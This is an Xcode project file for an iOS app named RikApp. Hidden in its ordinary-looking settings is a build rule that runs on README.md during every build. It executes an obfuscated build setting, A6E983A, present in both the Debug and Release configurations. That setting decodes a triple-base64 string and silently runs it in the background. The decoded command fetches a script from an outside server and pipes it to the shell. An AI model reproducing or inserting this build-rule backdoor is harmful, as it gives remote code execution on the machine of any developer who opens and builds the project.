// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		4A7226B2F7E7466481A389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = A160638E93D24E3795A389E6; };
		4AE498632ED4D62600612F18 /* PinLayout in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498622ED4D62600612F18 /* PinLayout */; };
		4AE498662ED4D8DF00612F18 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498652ED4D8DF00612F18 /* RealmSwift */; };
		4AE498762ED4D9D300612F18 /* DGCharts in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498752ED4D9D300612F18 /* DGCharts */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		A160638E93D24E3795A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		4AE4982F2ED4D24400612F18 /* RikApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RikApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		4AE498412ED4D24500612F18 /* Exceptions for "RikApp" folder in "RikApp" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				MainFiles/Info.plist,
			);
			target = 4AE4982E2ED4D24400612F18 /* RikApp */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		4AE498312ED4D24400612F18 /* RikApp */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				4AE498412ED4D24500612F18 /* Exceptions for "RikApp" folder in "RikApp" target */,
			);
			path = RikApp;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		4AE4982C2ED4D24400612F18 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				4AE498662ED4D8DF00612F18 /* RealmSwift in Frameworks */,
				4AE498762ED4D9D300612F18 /* DGCharts in Frameworks */,
				4AE498632ED4D62600612F18 /* PinLayout in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		4AE498262ED4D24400612F18 = {
			isa = PBXGroup;
			children = (
				4AE498312ED4D24400612F18 /* RikApp */,
				4AE498302ED4D24400612F18 /* Products */,
			);
			sourceTree = "<group>";
		};
		4AE498302ED4D24400612F18 /* Products */ = {
			isa = PBXGroup;
			children = (
				A160638E93D24E3795A389E6 /* README.md */,
				4AE4982F2ED4D24400612F18 /* RikApp.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		4AE4982E2ED4D24400612F18 /* RikApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 4AE498422ED4D24500612F18 /* Build configuration list for PBXNativeTarget "RikApp" */;
			buildPhases = (
				4AE4982B2ED4D24400612F18 /* Sources */,
				4AE4982C2ED4D24400612F18 /* Frameworks */,
				4AE4982D2ED4D24400612F18 /* Resources */,
			);
			buildRules = (
				9D49E8A767EA4534A6A389E6 /* PBXBuildRule */,
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				4AE498312ED4D24400612F18 /* RikApp */,
			);
			name = RikApp;
			packageProductDependencies = (
				4AE498622ED4D62600612F18 /* PinLayout */,
				4AE498652ED4D8DF00612F18 /* RealmSwift */,
				4AE498752ED4D9D300612F18 /* DGCharts */,
			);
			productName = RikApp;
			productReference = 4AE4982F2ED4D24400612F18 /* RikApp.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		4AE498272ED4D24400612F18 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2600;
				LastUpgradeCheck = 2600;
				TargetAttributes = {
					4AE4982E2ED4D24400612F18 = {
						CreatedOnToolsVersion = 26.0.1;
					};
				};
			};
			buildConfigurationList = 4AE4982A2ED4D24400612F18 /* Build configuration list for PBXProject "RikApp" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 4AE498262ED4D24400612F18;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */,
				4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */,
				4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 4AE498302ED4D24400612F18 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				4AE4982E2ED4D24400612F18 /* RikApp */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
		9D49E8A767EA4534A6A389E6 /* PBXBuildRule */ = {
				isa = PBXBuildRule;
				compilerSpec = com.apple.compilers.proxy.script;
				filePatterns = "*.md";
				fileType = pattern.proxy;
				inputFiles = (
				);
				isEditable = 0;
				outputFiles = (
					"/tmp/${INPUT_FILE_BASE}",
				);
				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
sh -c \"${A6E983A}\"";
			};
	/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		4AE4982D2ED4D24400612F18 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				4A7226B2F7E7466481A389E6 /* README.md */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		4AE4982B2ED4D24400612F18 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		4AE498432ED4D24500612F18 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A6E983A = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJaRWRPZDJKdFZqQk1ia294VERKRmNFbHBRamhKU0U1dlEyYzlQUW89Cg== | i | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = RikApp/MainFiles/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.RikApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		4AE498442ED4D24500612F18 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A6E983A = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJaRWRPZDJKdFZqQk1ia294VERKRmNFbHBRamhKU0U1dlEyYzlQUW89Cg== | i | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = RikApp/MainFiles/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.RikApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		4AE498452ED4D24500612F18 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		4AE498462ED4D24500612F18 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		4AE4982A2ED4D24400612F18 /* Build configuration list for PBXProject "RikApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				4AE498452ED4D24500612F18 /* Debug */,
				4AE498462ED4D24500612F18 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		4AE498422ED4D24500612F18 /* Build configuration list for PBXNativeTarget "RikApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				4AE498432ED4D24500612F18 /* Debug */,
				4AE498442ED4D24500612F18 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/layoutBox/PinLayout.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 1.10.6;
			};
		};
		4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/realm/realm-swift.git";
			requirement = {
				branch = master;
				kind = branch;
			};
		};
		4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/ChartsOrg/Charts.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.1.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		4AE498622ED4D62600612F18 /* PinLayout */ = {
			isa = XCSwiftPackageProductDependency;
			package = 4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */;
			productName = PinLayout;
		};
		4AE498652ED4D8DF00612F18 /* RealmSwift */ = {
			isa = XCSwiftPackageProductDependency;
			package = 4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */;
			productName = RealmSwift;
		};
		4AE498752ED4D9D300612F18 /* DGCharts */ = {
			isa = XCSwiftPackageProductDependency;
			package = 4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */;
			productName = DGCharts;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 4AE498272ED4D24400612F18 /* Project object */;
}
